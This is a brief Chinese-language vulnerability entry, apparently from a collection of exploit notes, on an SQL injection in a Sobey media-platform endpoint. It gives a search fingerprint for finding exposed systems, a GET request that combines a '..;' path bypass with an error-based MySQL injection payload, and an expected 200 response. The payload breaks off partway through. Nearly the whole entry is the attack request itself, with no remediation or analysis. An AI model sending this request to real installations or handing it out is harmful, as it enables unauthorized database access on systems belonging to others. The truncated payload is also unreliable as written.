# 索贝融媒体countJztArticleGroupByChannel2存在SQL注入漏洞

索贝融媒体 ｜ SQL注入 ｜ —
- **指纹**：`header="Sobey"`
- **请求**：`GET /sobey-mchEditor/js/..;/mch/Jzt/statistics/countJztArticleGroupByChannel2?siteCode=&token=&userCode=admin&channelId=1&catalogid=1&channelId=1+AND+GTID_SUBSET%28CONCAT%280x7e%2C%28SELECT+%28ELT%281`
- **响应特征**：200